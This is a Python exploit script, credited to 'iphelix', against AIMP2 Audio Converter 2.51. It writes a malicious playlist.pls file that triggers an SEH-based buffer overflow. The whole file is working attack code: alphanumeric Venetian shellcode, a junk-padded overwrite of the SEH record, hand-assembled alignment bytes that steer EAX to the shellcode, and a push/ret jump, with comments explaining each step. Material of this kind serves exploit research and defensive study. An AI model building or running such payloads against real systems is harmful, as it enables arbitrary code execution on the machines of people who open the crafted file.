#!/usr/bin/env python
# AIMP2 Audio Converter 2.51 exploit by iphelix

header = "[playlist]\nNumberOfEntries=1\n\n"
header+= "File1="

totalsize = 5000

totaljunk = 4029

# Venetian shellcode
shellcode = (
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAI"
"AXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK84IKPM0K"
"PQP3YZENQ8R344KB2NPTK1BLLDKPRMDTKRRMXLOX7OZMVNQKONQ7PVLOL31CLLBNLO0GQX"
"OLMM1I7JBZPPRB74K22LP4KOROLM1Z04KOPSHU5Y02TPJKQ8PPPTKQ8N8TKPXMPKQ9C9SO"
"LPITK04TKKQIFNQKONQGPVL7QHOLMM1WWNX9PD5L4KS3MJXOKCMO445YRQHTK0XO4KQ8SC"
"64KLLPKDKPXMLKQ9C4KKTTKKQHPTIOTMTMTQKQKQQPYQJPQKOK0QH1OQJ4KN2ZK4FQM2JM"
"14M3U6YM0M0M0PPQXNQTKRO3WKOJ5GKZPVUVB26RHUVTUGMUMKO9EOLKVCLLJSPKKK0CEL"
"EGKQ7N32RROBJKPPSKOJ51SC12L2CKPA"
)
junk = "A"*(totaljunk - len(shellcode))

nseh = "\x42\x6d" # single byte op + nop/align <--|
seh  = "\x0e\x45" # pop-pop-ret ------------------+

# Put a valid address from the stack into EAX
align = "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align

# Decrement EAX to point "almost" to the beginning of the buffer
# which contains the shellcode. The net effect is EAX - 0x1f00.
align+= "\x05\x01\x11" # add eax,11000100
align+= "\x6d"         # nop/align
align+= "\x2d\x20\x11" # sub eax,11002000
align+= "\x6d"         # nop/align

# Adjust EAX to point precisely to the beginning of the buffer
# NOTE: At this point EAX is 0x7a bytes short of the target.
# -0x7a negative complement is equivalent to 0x86.
# Unfortunately 0x86 can not be used since it is converted to 
# 0x2020 instead of the expected 0x8600, so we need to build it
# by adding 0x43 to itself.
align+= "\xb9\x43\xaa" # mov ecx 0xaa004300
align+= "\xed"         # add ch,ch (43+43 = 86) - no padding
align+= "\xe8"         # add al,ch (add 0x86 to al) - no padding
align+= "\x6d"         # nop/align

# Jump to the shellcode location
jump  = "\x50" # push eax
jump += "\x6d" # nop/align
jump += "\xc3" # ret

rest = "D"*(totalsize - len(shellcode + junk + nseh + seh + align + jump))

payload = header + shellcode + junk + nseh + seh + align + jump + rest
payload+= "\n"

f = open('playlist.pls','w')
f.write(payload)
f.close()
